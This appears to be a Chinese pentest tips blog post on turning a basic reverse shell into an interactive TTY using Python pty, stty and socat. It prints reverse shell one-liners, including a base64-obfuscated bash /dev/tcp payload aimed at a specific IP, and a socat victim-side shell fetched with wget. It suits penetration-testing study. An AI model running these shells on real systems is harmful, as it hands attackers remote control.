+++
title = '为 Reverse Shell 添加 TTY'
date = 2024-04-21T18:11:44+08:00
draft = false
categories = ['小技巧']
tags = ['Pentest', 'TTY', 'Reverse Shell']

# SEO 相关元数据
keywords = ["Reverse Shell", "TTY", "交互式Shell", "渗透测试", "Linux终端", "Python PTY", "socat", "stty", "Shell升级", "网络安全"]
summary = "详细介绍如何将简单的 Reverse Shell 升级为具有完整 TTY 功能的交互式 Shell。包含 Python PTY、socat、stty 等多种方法，提供完整的命令参考和实操步骤。"

# 开放图谱协议 (Open Graph)
[params]
  og_title = "为 Reverse Shell 添加 TTY - Iselt Hack Tips"
  og_description = "学习如何升级 Reverse Shell 为完全交互式的 TTY Shell，掌握多种实用方法和技巧，提升渗透测试效率。"
  og_type = "article"
+++

## Reverse Shell Cheat Sheet

<https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

```bash
/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'

echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzUyLjEzOS4xNTYuMzMvNDQ0NCAwPiYxJw== | base64 -d | bash
```

## Upgrading Simple Shells to Fully Interactive TTYs

<https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>

## 交互式 shell

### 设置环境变量

```bash
export TERM=xterm-256color
```

### python pty

`dpkg -l | grep python`
`which python`
`whereis python`
查看是否有 python 环境

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

可以实现简单的 tty，但是这种方式有个问题，当我们 Ctrl+C 的时候，所有连接都会断掉，又需要重新来一遍，而且 vim 虽然可以用，也有点问题，同时没有记录，无法使用上方向键执行上条命令。

### Upgrading from netcat with magic

> 注意：这种方式只适用于 bash，不适用于 zsh

首先，使用Python生成一个PTY。一旦bash在PTY中运行，用 `Ctrl-Z` 将shell放到后台。

![20240405230443](https://cfproxy.iselt.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240405230443.png)

当 shell 处于后台时，现在检查当前终端和 STTY 信息，以便我们可以强制连接的 shell 与其匹配

![20240405230459](https://cfproxy.iselt.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240405230459.png)

所需信息是 TERM 类型（“xterm-256color”）和当前 TTY 的大小（“rows 38; columns 116”）

在仍然处于后台的情况下，现在将当前的STTY设置为原始类型，并使用以下命令告诉它回显输入字符:

```bash
stty raw -echo
```

使用原始的stty，输入/输出会看起来很奇怪，你看不到下一个命令，但当你输入时，它们会被处理。

使用 fg 将 shell 置于前台。它将重新打开反向 shell，但格式将会出错。最后，使用 reset 重新初始化终端。

![20240405230515](https://cfproxy.iselt.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240405230515.png)

注意：我没有再次输入 nc 命令（因为它可能看起来像上面）。我实际输入了 fg ，但没有回显。 nc 命令是当前正在前台运行的作业。然后在netcat shell中输入了 reset 命令

在 reset 之后，shell 应该再次看起来正常。最后一步是设置 shell、终端类型和 stty 大小，以匹配我们当前的 Kali 窗口（根据上面收集的信息）。

```bash
export SHELL=bash
export TERM=xterm256-color
stty rows 38 columns 116
```

最终结果是通过netcat连接实现的具有所有我们期望的功能的完全交互式TTY（包括制表补全、历史记录、作业控制等）。

### socat (only linux)

socat 是类 Unix 系统下的一个工具，可以看作是 nc 的加强版。我们可以使用 socat 来传递完整的带有 tty 的 TCP 连接。缺点也很明显，只能在 linux 下面运行

下载地址：<https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat>

使用起来也很简单。

攻击机：

```bash
# 首先安装
sudo apt install socat
# 执行
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

目标机：

```bash
# 把 socat 上传到目标机器上或者直接下载
# 64 位
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
#32 位
wget https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx86.bin -O /tmp/socat

#从攻击机下载
攻击机指令：python3 -m http.server 8888

# 运行
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:4444
```

这种方式基本和 ssh 类似，ctrl+C 也不会直接断开。

### 速查表

#### 使用Python进行伪终端

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### 使用 socat

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

#### 使用stty选项

```bash
# In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
echo $TERM
stty -a
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```
